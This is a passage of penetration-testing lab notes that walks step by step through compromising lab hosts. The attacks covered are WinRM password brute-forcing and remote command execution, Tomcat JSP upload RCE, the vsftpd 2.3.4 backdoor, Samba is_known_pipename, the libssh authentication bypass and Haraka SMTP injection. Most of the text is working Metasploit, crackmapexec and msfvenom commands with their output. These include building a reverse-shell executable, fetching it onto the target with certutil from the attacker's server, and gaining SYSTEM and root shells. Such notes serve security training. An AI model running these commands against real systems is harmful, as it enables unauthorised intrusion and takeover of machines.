msf5 > use auxiliary/scanner/winrm/winrm_auth_methods
msf5 auxiliary(scanner/winrm/winrm_auth_methods) > 
msf5 auxiliary(scanner/winrm/winrm_auth_methods) > 
msf5 auxiliary(scanner/winrm/winrm_auth_methods) > options

Module options (auxiliary/scanner/winrm/winrm_auth_methods):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DOMAIN   WORKSTATION      yes       The domain to use for Windows authentification
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    5985             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   URI      /wsman           yes       The URI of the WinRM service
   VHOST                     no        HTTP server virtual host

msf5 auxiliary(scanner/winrm/winrm_auth_methods) > set RHOSTS 10.4.19.50
RHOSTS => 10.4.19.50
msf5 auxiliary(scanner/winrm/winrm_auth_methods) > run

[+] 10.4.19.50:5985: Negotiate protocol supported
[+] 10.4.19.50:5985: Basic protocol supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Target supports two authentication types i.e Basic and Negotiate.



<br />

**Execute command on the target server using winrm_cmd module. `auxiliary/scanner/winrm/winrm_cmd`**

```bash
msf5 > use auxiliary/scanner/winrm/winrm_cmd
msf5 auxiliary(scanner/winrm/winrm_cmd) > options

Module options (auxiliary/scanner/winrm/winrm_cmd):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD       ipconfig /all    yes       The windows command to run
   DOMAIN    WORKSTATION      yes       The domain to use for Windows authentification
   PASSWORD                   yes       The password to authenticate with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     5985             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                yes       The number of concurrent threads (max one per host)
   URI       /wsman           yes       The URI of the WinRM service
   USERNAME                   yes       The username to authenticate as
   VHOST                      no        HTTP server virtual host

msf5 auxiliary(scanner/winrm/winrm_cmd) > set RHOSTS 10.4.19.50
RHOSTS => 10.4.19.50
msf5 auxiliary(scanner/winrm/winrm_cmd) > set USERNAME administrator
USERNAME => administrator
msf5 auxiliary(scanner/winrm/winrm_cmd) > set PASSWORD tinkerbell
PASSWORD => tinkerbell
msf5 auxiliary(scanner/winrm/winrm_cmd) > set CMD whoami
CMD => whoami
msf5 auxiliary(scanner/winrm/winrm_cmd) > run

[+] 10.4.19.50:5985      : server\administrator

[+] Results saved to /root/.msf4/loot/20240115215534_default_10.4.19.50_winrm.cmd_result_317273.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

<br />

**get the meterpreter shell using metasploit `exploit/windows/winrm/winrm_script_exec`**

```bash
msf5 auxiliary(scanner/winrm/winrm_cmd) > use exploit/windows/winrm/winrm_script_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/winrm/winrm_script_exec) > options

Module options (exploit/windows/winrm/winrm_script_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
   FORCE_VBS  false            yes       Force the module to use the VBS CmdStager
   PASSWORD                    yes       A specific password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      5985             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URI        /wsman           yes       The URI of the WinRM service
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       A specific username to authenticate as
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.23.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 10.4.19.50
RHOSTS => 10.4.19.50
msf5 exploit(windows/winrm/winrm_script_exec) > set USERNAME administrator
USERNAME => administrator
msf5 exploit(windows/winrm/winrm_script_exec) > set PASSWORD tinkerbell
PASSWORD => tinkerbell
msf5 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
FORCE_VBS => true
msf5 exploit(windows/winrm/winrm_script_exec) > run

[*] Started reverse TCP handler on 10.10.23.3:4444 
[*] User selected the FORCE_VBS option
[*] Sending stage (176195 bytes) to 10.4.19.50
[*] Meterpreter session 1 opened (10.10.23.3:4444 -> 10.4.19.50:49897) at 2024-01-15 22:01:46 +0530
[*] Session ID 1 (10.10.23.3:4444 -> 10.4.19.50:49897) processing InitialAutoRunScript 'post/windows/manage/priv_migrate'
[*] Current session process is knbph.exe (4800) as: SERVER\Administrator
[*] Session is Admin but not System.
[*] Will attempt to migrate to specified System level process.
[-] Could not migrate to services.exe.
[-] Could not migrate to wininit.exe.
[*] Trying svchost.exe (892)
[+] Successfully migrated to svchost.exe (892) as: NT AUTHORITY\SYSTEM
[*] nil
[*] Command Stager progress - 100.00% done (101936/101936 bytes)

meterpreter > pwd
C:\Windows\system32
```

<br />

**bruteforce winRM credentials using crackmapexec**

```bash
root@attackdefense:~# crackmapexec winrm 10.4.19.50 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
WINRM       10.4.19.50      5985   NONE             [*] http://10.4.19.50:5985/wsman
WINRM       10.4.19.50      5985   NONE             [-] None\administrator:admin "Failed to authenticate the user administrator with ntlm"

WINRM       10.4.19.50      5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)

```

<br />

**execute commands with winRM credentials using crackmapexec**

```bash
root@attackdefense:~# crackmapexec winrm 10.4.19.50 -u administrator -p tinkerbell -x whoami
WINRM       10.4.19.50      5985   NONE             [*] http://10.4.19.50:5985/wsman
WINRM       10.4.19.50      5985   NONE             [+] None\administrator:tinkerbell (Pwn3d!)
WINRM       10.4.19.50      5985   NONE             [+] Executed command
WINRM       10.4.19.50      5985   NONE             server\administrator

```

<br />

**get cmd shell with `evil-winrm.rb` with winRM credentials**

```bash
root@attackdefense:~# evil-winrm.rb -u administrator -p tinkerbell -i 10.4.19.50 
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
server\administrator

```



---

#### Exploiting A Vulnerable Apache Tomcat Web Server

+ Apache Tomcat, also known as Tomcat server, is a popular, free and open source Java servlet web server.
+ It is used to build and host dynamic websites and web applications based on the Java software platform.
+ Apache Tomcat utilizes the HTTP protocol to facilitate the underlying communication between the server and clients.
+ Apache Tomcat runs on TCP port 8080 by default.
+ The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.
+ The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.
+ Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server.
+ We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server.







```bash
root@attackdefense:~# nmap 10.4.17.96 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 20:13 IST
Nmap scan report for 10.4.17.96
Host is up (0.0098s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
8080/tcp  open  http               Apache Tomcat 8.5.19
```

Note: Apache Tomcat V8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP payload in order to gain remote access to the target server.



**exploit Apache Tomcat V8.5.19 using metasploit `exploit/multi/http/tomcat_jsp_upload_bypass` **

```bash
msf5 > use exploit/multi/http/tomcat_jsp_upload_bypass
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > options

Module options (exploit/multi/http/tomcat_jsp_upload_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI path of the Tomcat installation
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOSTS 10.4.17.96
RHOSTS => 10.4.17.96
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set PAYLOAD java/jsp_shell_bind_tcp
PAYLOAD => java/jsp_shell_bind_tcp
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > options 

Module options (exploit/multi/http/tomcat_jsp_upload_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.4.17.96       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI path of the Tomcat installation
   VHOST                       no        HTTP server virtual host


Payload options (java/jsp_shell_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  10.4.17.96       no        The target address
   SHELL                   no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set SHELL cmd   <<<<<<<======== cmd because it is a windows machine
SHELL => cmd
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > run

[*] Uploading payload...
[-] Exploit aborted due to failure: payload-failed: Failed to execute the payload
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > info

       Name: Tomcat RCE via JSP Upload Bypass
     Module: exploit/multi/http/tomcat_jsp_upload_bypass
   Platform: Linux, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2017-10-03

Provided by:
  peewpw

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   Java Windows
  2   Java Linux

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.4.17.96       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      8080             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The URI path of the Tomcat installation
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module uploads a jsp payload and executes it.

References:
  https://cvedetails.com/cve/CVE-2017-12617/
  http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617
  https://bz.apache.org/bugzilla/show_bug.cgi?id=61542

msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > options 

Module options (exploit/multi/http/tomcat_jsp_upload_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.4.17.96       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI path of the Tomcat installation
   VHOST                       no        HTTP server virtual host


Payload options (java/jsp_shell_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  10.4.17.96       no        The target address
   SHELL  cmd              no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > exploit 

[*] Uploading payload...
[*] Payload executed!
[*] Started bind TCP handler against 10.4.17.96:4444
[*] Command shell session 1 opened (10.10.23.7:45493 -> 10.4.17.96:4444) at 2024-02-02 20:22:52 +0530

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 8.5>pwd
pwd

C:\Program Files\Apache Software Foundation\Tomcat 8.5>whoami
whoami
nt authority\system

```



**upgrate the cmd metasploit session to meterpreter session**

```bash
C:\Program Files\Apache Software Foundation\Tomcat 8.5>^Z
Background session 1? [y/N]  y
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions 

Active sessions
===============

  Id  Name  Type              Information  Connection
  --  ----  ----              -----------  ----------
  1         shell java/linux               10.10.23.7:45493 -> 10.4.17.96:4444 (10.4.17.96)

msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[-] Shells on the target platform, linux, cannot be upgraded to Meterpreter at this time.

```

it did not work because the type of the session is java/linux not windows, so we could not upgrade the session with the default module 



**generate a windows payload with msfvenom **

```bash
root@attackdefense:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.23.7 LPORT=4444 -f exe > payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
root@attackdefense:~# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.4.17.96 - - [02/Feb/2024 20:41:37] "GET /payload.exe HTTP/1.1" 200 -
10.4.17.96 - - [02/Feb/2024 20:41:38] "GET /payload.exe HTTP/1.1" 200 -

```





**transfer the payload to the target**

```cmd
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions -i 1
[*] Starting interaction with 1...



C:\Program Files\Apache Software Foundation\Tomcat 8.5>certutil -urlcache -f http://10.10.23.7:8080/payload.exe payload.exe
certutil -urlcache -f http://10.10.23.7:8080/payload.exe payload.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Program Files\Apache Software Foundation\Tomcat 8.5>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 8.5

02/02/2024  03:11 PM    <DIR>          .
02/02/2024  03:11 PM    <DIR>          ..
09/16/2020  06:00 AM    <DIR>          bin
09/16/2020  06:02 AM    <DIR>          conf
09/16/2020  06:00 AM    <DIR>          lib
07/24/2017  09:01 PM            58,153 LICENSE
02/02/2024  02:38 PM    <DIR>          logs
07/24/2017  09:01 PM             1,774 NOTICE
02/02/2024  03:11 PM            73,802 payload.exe
07/24/2017  09:01 PM             7,241 RELEASE-NOTES
09/16/2020  06:00 AM    <DIR>          temp
07/24/2017  09:01 PM            21,630 tomcat.ico
07/24/2017  09:01 PM            73,624 Uninstall.exe
09/16/2020  06:00 AM    <DIR>          webapps
09/16/2020  06:00 AM    <DIR>          work
               6 File(s)        236,224 bytes
               9 Dir(s)   8,627,826,688 bytes free

C:\Program Files\Apache Software Foundation\Tomcat 8.5>

```



**run the payload to get meterpreter reverse shell**

```cmd
victime:
C:\Program Files\Apache Software Foundation\Tomcat 8.5>./payload.exe
./payload.exe



attacker:
msf5 > use multi/handler
msf5 exploit(multi/handler) > set LHOST 10.10.23.7 
LHOST => 10.10.23.7
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.23.7:4444 
[*] Sending stage (180291 bytes) to 10.4.17.96
[*] Meterpreter session 1 opened (10.10.23.7:4444 -> 10.4.17.96:49361) at 2024-02-02 20:52:24 +0530

meterpreter > pwd
C:\Program Files\Apache Software Foundation\Tomcat 8.5

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```



---

### Linux Exploitation

#### Exploiting A Vulnerable FTP Server    

+ FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.
+ It is also frequently used as a means of transferring files to and from the directory of a web server.
+ vsftpd is an FTP server for Unix-like systems including Linux systems and is the default FTP server for Ubuntu, CentOS and Fedora.
+ vsftpd V2.3.4 is vulnerable to a command execution vulnerability that is facilitated by a malicious backdoor that was added to the vsftpd download
archive through a supply chain attack.



```cmd
root@attackdefense:~# nmap 192.49.174.3 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 15:53 UTC
Nmap scan report for target-1 (192.49.174.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4



msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.49.174.3
RHOSTS => 192.49.174.3
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.49.174.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.49.174.3:21 - USER: 331 Please specify the password.
[+] 192.49.174.3:21 - Backdoor service has been spawned, handling...
[+] 192.49.174.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.49.174.2:37445 -> 192.49.174.3:6200) at 2024-02-02 15:54:11 +0000

id
uid=0(root) gid=0(root) groups=0(root)
pwd
/root/vsftpd-2.3.4
```



**upgrade the session to meterpreter session**

```bash
^Z
Background session 1? [y/N]  y
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.49.174.2:37445 -> 192.49.174.3:6200 (192.49.174.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.49.174.2:4433 
[*] Sending stage (985320 bytes) to 192.49.174.3
[*] Meterpreter session 2 opened (192.49.174.2:4433 -> 192.49.174.3:60024) at 2024-02-02 15:57:26 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         shell cmd/unix                      192.49.174.2:37445 -> 192.49.174.3:6200 (192.49.174.3)
  2         meterpreter x86/linux               192.49.174.2:4433 -> 192.49.174.3:60024 (192.49.174.3)
```



---

#### Exploiting Samba    

+ SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).
+ SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
+ Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
+ Samba V3.5.0 is vulnerable to a remote code execution vulnerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.

```bash
root@attackdefense:~# nmap 192.196.243.3  -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:04 UTC
Nmap scan report for target-1 (192.196.243.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:42:C0:C4:F3:03 (Unknown)
Service Info: Host: VICTIM-1


root@attackdefense:~# nmap 192.196.243.3  -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:06 UTC
Nmap scan report for target-1 (192.196.243.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
MAC Address: 02:42:C0:C4:F3:03 (Unknown)
Service Info: Host: VICTIM-1

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.17)
|   Computer name: victim-1
|   NetBIOS computer name: VICTIM-1\x00
|   Domain name: 
|   FQDN: victim-1
|_  System time: 2024-02-02T16:06:40+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-02 16:06:42
|_  start_date: N/A

```



**exploit samba using metasploit `exploit/linux/samba/is_known_pipename`**

```bash
msf5 >  use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > set RHOSTS 192.196.243.3
RHOSTS => 192.196.243.3
msf5 exploit(linux/samba/is_known_pipename) > options 

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOSTS          192.196.243.3    yes       The target address range or CIDR identifier
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)
msf5 exploit(linux/samba/is_known_pipename) > check

[+] 192.196.243.3:445 - Samba version 4.1.17 found with writeable share 'exploitable'
[*] 192.196.243.3:445 - The target appears to be vulnerable.

msf5 exploit(linux/samba/is_known_pipename) > run

[*] 192.196.243.3:445 - Using location \\192.196.243.3\exploitable\tmp for the path
[*] 192.196.243.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.196.243.3:445 - Share 'exploitable' has server-side path '/
[*] 192.196.243.3:445 - Uploaded payload to \\192.196.243.3\exploitable\tmp\fDvkxWbi.so
[*] 192.196.243.3:445 - Loading the payload from server-side path /tmp/fDvkxWbi.so using \\PIPE\/tmp/fDvkxWbi.so...
[-] 192.196.243.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.196.243.3:445 - Loading the payload from server-side path /tmp/fDvkxWbi.so using /tmp/fDvkxWbi.so...
[+] 192.196.243.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.196.243.2:36815 -> 192.196.243.3:445) at 2024-02-02 16:15:44 +0000

id
uid=0(root) gid=0(root) groups=0(root)
Background session 2? [y/N]  y
msf5 exploit(linux/samba/is_known_pipename) > sessions 

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  2         shell cmd/unix               192.196.243.2:40413 -> 192.196.243.3:445 (192.196.243.3)

msf5 exploit(linux/samba/is_known_pipename) > sessions -u 2
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.196.243.2:4433 
[*] Sending stage (985320 bytes) to 192.196.243.3
[*] Meterpreter session 3 opened (192.196.243.2:4433 -> 192.196.243.3:44928) at 2024-02-02 16:18:25 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(linux/samba/is_known_pipename) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  2         shell cmd/unix                                                       192.196.243.2:40413 -> 192.196.243.3:445 (192.196.243.3)
  3         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.196.243.3  192.196.243.2:4433 -> 192.196.243.3:44928 (192.196.243.3)
```



---

#### Exploiting A Vulnerable SSH Server    

+ SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.
+ It is typically used for remote access to servers and systems.
+ SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
+ libssh is a multiplatform C library implementing the SSHv2 protocol on client and server side.
+ libssh V0.6.0-0.8.0 is vulnerable to an authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server.



```bash
root@attackdefense:~# nmap 192.81.192.3 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:22 UTC
Nmap scan report for target-1 (192.81.192.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.70%I=7%D=2/2%Time=65BD16E9%P=x86_64-pc-linux-gnu%r(NULL,
SF:16,"SSH-2\.0-libssh_0\.8\.3\r\n");    <<<<<<<<============== libssh 
MAC Address: 02:42:C0:51:C0:03 (Unknown)

```



```bash
msf5 > use auxiliary/scanner/ssh/libssh_auth_bypass
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > options 

Module options (auxiliary/scanner/ssh/libssh_auth_bypass):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_BANNER  true             no        Check banner for libssh
   CMD                            no        Command or alternative shell
   RHOSTS                         yes       The target address range or CIDR identifier
   RPORT         22               yes       The target port
   SPAWN_PTY     false            no        Spawn a PTY
   THREADS       1                yes       The number of concurrent threads


Auxiliary action:

   Name   Description
   ----   -----------
   Shell  Spawn a shell


msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set RHOSTS 192.81.192.3
RHOSTS => 192.81.192.3
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set SPAWN_PTY true 
SPAWN_PTY => true
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 192.81.192.3:22 - Attempting authentication bypass
[*] Command shell session 1 opened (192.81.192.2:36631 -> 192.81.192.3:22) at 2024-02-02 16:25:58 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions 

Active sessions
===============

  Id  Name  Type   Information                                                  Connection
  --  ----  ----   -----------                                                  ----------
  1         shell   libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3)  192.81.192.2:36631 -> 192.81.192.3:22 (192.81.192.3)

msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions -i 1
[*] Starting interaction with 1...

[root@victim-1 /]# id
id
uid=0(root) gid=0(root) groups=0(root)
```



---

#### Exploiting A Vulnerable SMTP Server

+ SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.
+ SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.
+ Haraka is an open source high performance SMTP server developed in Node.js.
+ The Haraka SMTP server comes with a plugin for processing attachments. Haraka versions prior to V2.8.9 are vulnerable to command injection.



```bash
root@attackdefense:~# nmap 192.177.133.3 -sV 
Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:31 UTC
Nmap scan report for target-1 (192.177.133.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Haraka smtpd 2.8.8
MAC Address: 02:42:C0:B1:85:03 (Unknown)
Service Info: Host: victim-1

```



**exploit SMTP haraka using metasploit `exploit/linux/smtp/haraka`**

```bash
msf5 > use exploit/linux/smtp/haraka
msf5 exploit(linux/smtp/haraka) > set RHOST 192.177.133.3
RHOST => 192.177.133.3
msf5 exploit(linux/smtp/haraka) > options 

Module options (exploit/linux/smtp/haraka):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     8080             yes       The local port to listen on.
   SSL         false            no        Negotiate SSL for incoming connections
   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                      no        The URI to use for this exploit (default is random)
   email_from  foo@example.com  yes       Address to send from
   email_to    admin@localhost  yes       Email to send to, must be accepted by the server
   rhost       192.177.133.3    yes       Target server
   rport       25               yes       Target server port


Exploit target:

   Id  Name
   --  ----
   0   linux x64


msf5 exploit(linux/smtp/haraka) > set SRVPORT 9898
SRVPORT => 9898
msf5 exploit(linux/smtp/haraka) > set email_to root@attackdefense.test
email_to => root@attackdefense.test
msf5 exploit(linux/smtp/haraka) > set PAYLOAD linux/x64/meterpreter_reverse_http
PAYLOAD => linux/x64/meterpreter_reverse_http
msf5 exploit(linux/smtp/haraka) > set LHOST  192.177.133.2
LHOST => 192.177.133.2
msf5 exploit(linux/smtp/haraka) > options 

Module options (exploit/linux/smtp/haraka):

   Name        Current Setting          Required  Description
   ----        ---------------          --------  -----------
   SRVHOST     0.0.0.0                  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
